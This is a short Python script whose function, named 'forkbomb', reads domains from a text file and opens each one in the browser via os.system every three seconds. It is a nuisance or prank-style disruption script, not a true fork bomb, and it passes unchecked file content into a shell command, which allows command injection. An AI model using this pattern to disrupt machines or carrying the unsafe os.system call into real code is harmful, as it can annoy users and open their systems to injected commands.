import os
import time
def forkbomb():
  number = 0
  file = open("domains.txt", "r")
  content = file.readlines()
  for line in content:
    time.sleep(3)
    os.system("xdg-open https://" + line)
